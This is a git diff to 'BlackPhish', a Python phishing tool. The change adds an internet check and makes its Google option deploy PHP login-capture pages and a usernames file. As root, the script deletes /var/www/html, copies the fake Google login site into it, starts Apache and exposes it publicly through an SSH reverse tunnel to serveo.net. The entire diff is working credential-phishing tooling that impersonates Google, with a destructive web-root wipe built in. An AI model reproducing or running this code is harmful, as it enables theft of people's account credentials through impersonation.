@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-# version 2.2: - Added Google Site
+# version 2.3: - Added Check Internet
 
 # Please update version number each time we update
 
@@ -8,6 +8,8 @@
 # Libraries #
 try:
     import os
+    from time import sleep
+    import socket
 except ImportError:
     print("\033[31;1m" + "[!] Import Error, Aborting! \033[0m")
     exit(1)
@@ -24,21 +26,31 @@ yellow = "\033[93;1m"
 magenta = "\033[95;1m"
 blue = "\033[94;1m"
 white = "\033[97;1m"
+blink = "\033[5m"
 
 # Check for root #
 if os.geteuid() != 0:
     exit(red + "[!] Please run as root" + reset)
 
+def checkint():
+    print(yellow + "[*] Checking connection...")
+    try:
+        socket.create_connection(("www.google.com", 80))
+        print(green + "[+] Internet Found")
+        sleep(2)
+    except OSError:
+        print(red + "[!] Internet Not Found" + reset)
+        exit(0)
+    
 # Port forward to serveo #
 def serveo_forward():
     os.system('ssh -o ServerAliveInterval=3000 -R inc0gnit0:80:localhost:80 serveo.net')
-    #subprocess.Popen(["rm","-r","some.file"])
 
 # Banner #
 def banner():
     print('''
  \033[91;1m
-                https://github.com/iinc0gnit0/BlackPhish \033[94;1m
+                https://github.com/iinc0gnit0/BlackPhish \033[94;1m \033[5m
 
                              ░███░                                   ░█░   
                            ░█████                                  ░███    
@@ -57,7 +69,7 @@ def banner():
                    ░████                                                   
                     ░███                                                   
                       ░█      
-                                                      \033[91m
+                                                      \033[0m\033[91m
         ▀█████████▄                      ▀████████▄
           ███    ███                       ███    ███  
           ███    ███                       ███    ███ 
@@ -72,7 +84,7 @@ def banner():
                     
                     Script created by: \033[91;1m[inc0gnit0] [retro0001]\033[94;1m
                     
-                    Websites created by: \033[91;1m[TableFlipGod] \033[91;1m 
+                    Websites created by: \033[91;1m[TableFlipGod]\033[91;1m 
                     
                     
                     
@@ -85,6 +97,10 @@ def banner():
 
 # Main Script #
 def main():
+    os.system("clear")
+    
+    checkint()
+
     os.system('clear') # clear #
     banner() # Load Banner #
     choice = input(red + "        [BlackPhish] -> ") # Get user input #
@@ -99,6 +115,7 @@ def main():
         os.system('service apache2 start')
         print(green + '[+] Apache2 Service Started')
         serveo_forward()
+        print(green + '[+] Serveo is working')
         print(green + '[+] Done')
         main()
         
@@ -107,11 +124,15 @@ def main():
         print(green + '[+] Copying Files')
         print(green + '[+] Cleaning /var/www/html/')
         os.system('rm -r /var/www/html/ && mkdir /var/www/html/')
-        os.system('cp '+'-r '+ cwd  + '/Websites/Google/index.html' " /var/www/html/")
+        os.system('cp '+'-r '+ cwd  + '/Websites/Google/index.php' " /var/www/html/")
+        os.system('cp '+'-r '+ cwd  + '/Websites/Google/accounts.login.php' " /var/www/html/")
+        os.system('cp '+'-r '+ cwd  + '/Websites/Google/login.php' " /var/www/html/")
+        os.system('cp '+'-r '+ cwd  + '/Websites/Google/usernames.txt' " /var/www/html/")
         print(green + '[+] Starting Apache2 Service')
         os.system('service apache2 start')
         print(green + '[+] Apache2 Service Started')
         serveo_forward()
+        print(green + '[+] Serveo is working')
         print(green + '[+] Done')
         main()
 
